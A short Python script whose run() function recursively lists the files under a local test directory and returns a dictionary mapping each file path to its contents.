import os
import collections

def run(**args):
	a = []
	dic = GetFileList(r'D:/test',a)
	return dic

def GetFileList(Dir,fileList):
	dic = collections.defaultdict()
	newDir = Dir
	if os.path.isfile(Dir):
		fileList.append(Dir)
	elif os.path.isdir(Dir):
		for s in os.listdir(Dir):
			newDir = os.path.join(Dir,s)
			GetFileList(newDir, fileList)
	for file in fileList:
		if os.path.isfile(file):
			fp = open(file)
			dic[file] = fp.read()
			fp.close()
	return dic

